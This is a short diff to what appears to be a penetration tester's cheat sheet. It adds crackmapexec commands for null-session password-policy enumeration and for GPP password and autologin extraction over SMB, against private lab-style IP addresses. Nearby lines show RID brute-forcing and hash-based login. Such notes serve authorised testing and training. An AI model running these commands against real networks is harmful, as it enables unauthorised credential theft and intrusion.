@@ -654,8 +654,12 @@ crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 
 crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
 
+# pass-pol
+crackmapexec smb 10.129.204.177  -u '' -p '' --pass-pol
+
 # GPP
 ## gpp-decryp cmd
+crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_password
 crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
 ```
 ### PsMapexec
